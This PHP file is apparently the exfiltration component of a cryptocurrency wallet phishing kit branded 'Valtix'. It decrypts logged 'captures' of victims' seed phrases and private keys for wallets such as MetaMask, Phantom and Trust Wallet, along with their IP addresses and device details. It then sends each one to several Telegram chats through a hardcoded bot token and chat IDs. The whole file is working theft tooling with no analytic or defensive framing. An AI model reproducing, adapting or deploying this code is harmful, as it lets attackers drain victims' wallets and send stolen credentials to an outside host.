<?php
/**
 * telegram_sender.php - Background process
 * Reads logs/captures.log and sends new entries to Telegram.
 * Run via: php /var/www/html/telegram_sender.php
 */

// Small delay to ensure other services are ready
sleep(3);

$BASE_DIR       = '/var/www/html';
$LOG_FILE       = $BASE_DIR . '/logs/captures.log';
$SENT_FILE      = $BASE_DIR . '/logs/sent_tg.log';
$ERROR_LOG      = $BASE_DIR . '/logs/telegram_errors.log';
$ENCRYPTION_KEY = 'Valtix_Render_2026_SecretKey!!';
$ENCRYPTION_IV  = '1234567890abcdef';
$BOT_TOKEN      = getenv('TELEGRAM_BOT_TOKEN') ?: '8771510966:AAGsaZJhzefxDFmK5CHBLsIFnKt9nT4itgQ';
$CHAT_IDS       = [
    getenv('TELEGRAM_CHAT_ID') ?: '6964954278',
    '8955126022',
    '8895304810'
];

$walletEmoji = [
    'phantom'     => '👻 Phantom',
    'metamask'    => '🦊 MetaMask',
    'trustwallet' => '💙 Trust Wallet',
    'solflare'    => '☀️ Solflare',
    'coinbase'    => '🔵 Coinbase',
    'backpack'    => '🎒 Backpack',
    'okx'         => '🔶 OKX',
    'rabby'       => '🐰 Rabby',
];

// Ensure files exist
if (!is_dir($BASE_DIR . '/logs')) {
    mkdir($BASE_DIR . '/logs', 0755, true);
}
if (!file_exists($SENT_FILE)) {
    file_put_contents($SENT_FILE, '');
}

echo "[Telegram Sender] Started.\n";
echo "[Telegram Sender] Watching: {$LOG_FILE}\n";
echo "[Telegram Sender] Bot token starts with: " . substr($BOT_TOKEN, 0, 15) . "...\n";
echo "[Telegram Sender] Chat IDs: " . implode(', ', $CHAT_IDS) . "\n";

$lastChecked = 0;

while (true) {
    clearstatcache();

    if (!file_exists($LOG_FILE)) {
        if (time() - $lastChecked > 30) {
            echo "[Telegram Sender] Waiting for {$LOG_FILE}...\n";
            $lastChecked = time();
        }
        sleep(3);
        continue;
    }

    $contents = file_get_contents($LOG_FILE);
    if (empty(trim($contents))) {
        sleep(3);
        continue;
    }

    $lines     = file($LOG_FILE, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    $sentLines = file_exists($SENT_FILE) ? file($SENT_FILE, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES) : [];

    if (empty($lines)) {
        sleep(3);
        continue;
    }

    $newCount = 0;

    foreach ($lines as $lineIndex => $rawLine) {
        $lineHash = md5($rawLine);

        if (in_array($lineHash, $sentLines)) {
            continue;
        }

        // Decrypt
        $decrypted = openssl_decrypt(
            base64_decode($rawLine),
            'aes-256-cbc',
            $ENCRYPTION_KEY,
            0,
            $ENCRYPTION_IV
        );

        if (!$decrypted) {
            file_put_contents($ERROR_LOG, "[!] Failed to decrypt line {$lineIndex}\n", FILE_APPEND);
            file_put_contents($SENT_FILE, $lineHash . "\n", FILE_APPEND);
            continue;
        }

        $data = json_decode($decrypted, true);
        if (!$data) {
            file_put_contents($ERROR_LOG, "[!] Failed to decode JSON at line {$lineIndex}\n", FILE_APPEND);
            file_put_contents($SENT_FILE, $lineHash . "\n", FILE_APPEND);
            continue;
        }

        // Extract fields
        $walletKey  = strtolower($data['wallet'] ?? '');
        $walletName = $data['walletName'] ?? '';
        $seed       = $data['seed'] ?? $data['seedPhrase'] ?? $data['recoveryPhrase'] ?? '';
        $pkey       = $data['pkey'] ?? $data['privateKey'] ?? $data['private_key'] ?? '';
        $time       = $data['timestamp'] ?? $data['capturedAt'] ?? date('Y-m-d H:i:s');
        $ip         = $data['ip'] ?? $data['IP'] ?? 'Unknown';
        $id         = $data['id'] ?? substr(md5($seed . $pkey . $time), 0, 8);
        $ua         = $data['userAgent'] ?? '';
        $screen     = $data['screenSize'] ?? '';

        // Wallet label
        if (!empty($walletName)) {
            $walletLabel = "👛 {$walletName}";
        } elseif (isset($walletEmoji[$walletKey])) {
            $walletLabel = $walletEmoji[$walletKey];
        } else {
            $walletLabel = '👛 Unknown';
        }

        $wordCount = !empty($seed) ? count(explode(' ', trim($seed))) : 0;

        // Build message
        $message = "🚨 *Valtix — New Capture* 🚨\n";
        $message .= "━━━━━━━━━━━━━━━━━━\n";
        $message .= "💰 *Wallet:* {$walletLabel}\n";
        $message .= "🆔 *ID:* `{$id}`\n";
        $message .= "📅 *Time:* {$time}\n";
        $message .= "🌐 *IP:* `{$ip}`\n";
        $message .= "━━━━━━━━━━━━━━━━━━\n";

        if (!empty($seed)) {
            $message .= "📝 *Seed Phrase ({$wordCount} words):*\n`{$seed}`\n";
        } else {
            $message .= "📝 *Seed:* ❌ None\n";
        }

        $message .= "\n";

        if (!empty($pkey)) {
            $message .= "🔑 *Private Key:*\n`{$pkey}`\n";
        } else {
            $message .= "🔑 *Private Key:* ❌ None\n";
        }

        if (!empty($screen)) {
            $message .= "📱 *Screen:* {$screen}\n";
        }
        if (!empty($ua)) {
            $message .= "💻 *UA:* " . substr($ua, 0, 80) . "\n";
        }

        $message .= "━━━━━━━━━━━━━━━━━━\n";
        $message .= "⚡ *Valtix Intelligence*";

        // Send to all chat IDs
        foreach ($CHAT_IDS as $chatId) {
            $chatId = trim($chatId);
            if (empty($chatId)) continue;

            $ch = curl_init();
            curl_setopt_array($ch, [
                CURLOPT_URL            => "https://api.telegram.org/bot{$BOT_TOKEN}/sendMessage",
                CURLOPT_POST           => true,
                CURLOPT_POSTFIELDS     => json_encode([
                    'chat_id'    => $chatId,
                    'text'       => $message,
                    'parse_mode' => 'Markdown',
                ]),
                CURLOPT_HTTPHEADER     => ['Content-Type: application/json'],
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_TIMEOUT        => 10,
            ]);
            $resp = curl_exec($ch);
            $http = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            curl_close($ch);

            if ($http !== 200) {
                $err = "[!] TG send to {$chatId} failed (HTTP {$http}): " . substr($resp, 0, 200) . "\n";
                echo $err;
                file_put_contents($ERROR_LOG, $err, FILE_APPEND);
            } else {
                $newCount++;
                echo "[✓] Sent to {$chatId} | Wallet: {$walletLabel} | Seed: " . (!empty($seed) ? 'YES (' . $wordCount . ' words)' : 'NO') . " | Key: " . (!empty($pkey) ? 'YES' : 'NO') . "\n";
            }
        }

        file_put_contents($SENT_FILE, $lineHash . "\n", FILE_APPEND);
    }

    if ($newCount > 0) {
        echo "[Telegram Sender] Sent {$newCount} new capture(s).\n";
    }

    sleep(5);
}
